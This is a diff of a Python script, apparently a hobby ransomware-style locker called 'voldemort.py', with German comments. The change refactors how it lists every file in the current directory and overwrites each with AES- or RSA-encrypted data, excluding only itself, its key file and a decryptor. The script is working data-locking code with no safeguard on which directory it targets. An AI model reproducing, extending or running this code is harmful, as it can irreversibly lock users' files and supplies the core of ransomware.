@@ -44,24 +44,12 @@ def rsa_encrypt(public_key, data):
     )
     return encrypted_data
 
-
-# Auswahl ob es mit AES oder RSA verschüsslet werden soll
-def main():
-    print("Wählen den Verschlüsselungsalgorithmus:")
-    print("1. AES")
-    print("2. RSA")
-    value = True
-    choice = input("Deine Wahl (1 oder 2): ")
-
-# Dateien finden
+def checkIf():
+    # Dateien finden
     files = []
-
     for file in os.listdir():
-        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py" or file == "aes_key.enc"  or file.startswith('.'):
-            continue
         if os.path.isfile(file):
             files.append(file)
-    print("Files to encrypt:", files)
 
 # Dateien verschlüsseln
     for file in files:
@@ -72,22 +60,25 @@ def main():
 # Bereits verschlüsselte Dateien überspringen
         if MARKER.encode() in contents:
             print(f"{file} ist bereits verschlüsselt.")
-            value = False
-            continue
-
-        encrypted_data = encrypt_func(contents) + MARKER.encode()
-        with file_path.open("wb") as thefile:
-            thefile.write(encrypted_data)
-
-    print("Files successfully encrypted.")
+            return False
     
-    if choice == "1" and value:
+    return True
+    
+
+# Auswahl ob es mit AES oder RSA verschüsslet werden soll
+def main():
+    print("Wählen den Verschlüsselungsalgorithmus:")
+    print("1. AES")
+    print("2. RSA")
+    choice = input("Deine Wahl (1 oder 2): ")
+
+    if choice == "1" and checkIf():
         aes_key = generate_aes_key()
         with open("thekey.key", "wb") as key_file:
             key_file.write(aes_key)
         encrypt_func = lambda data: aes_encrypt(aes_key, data)
         print("AES Schlüssel generiert.")
-    elif choice == "2" and value:
+    elif choice == "2" and checkIf():
         aes_key = generate_aes_key()
         rsa_key = generate_rsa_key()
         with open("thekey.key", "wb") as key_file:
@@ -105,6 +96,34 @@ def main():
     else:
         print("Ungültige Wahl!")
         return
+
+
+
+# Dateien finden
+    files = []
+    for file in os.listdir():
+        if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py"or file == "aes_key.enc"  or file.startswith('.'):
+            continue
+        if os.path.isfile(file):
+            files.append(file)
+    print("Files to encrypt:", files)
+
+# Dateien verschlüsseln
+    for file in files:
+        file_path = Path(file)
+        with file_path.open("rb") as thefile:
+            contents = thefile.read()
+
+# Bereits verschlüsselte Dateien überspringen
+        if MARKER.encode() in contents:
+            print(f"{file} ist bereits verschlüsselt.")
+            continue
+
+        encrypted_data = encrypt_func(contents) + MARKER.encode()
+        with file_path.open("wb") as thefile:
+            thefile.write(encrypted_data)
+
+    print("Files successfully encrypted.")
 
 if  __name__ == "__main__":
     main()
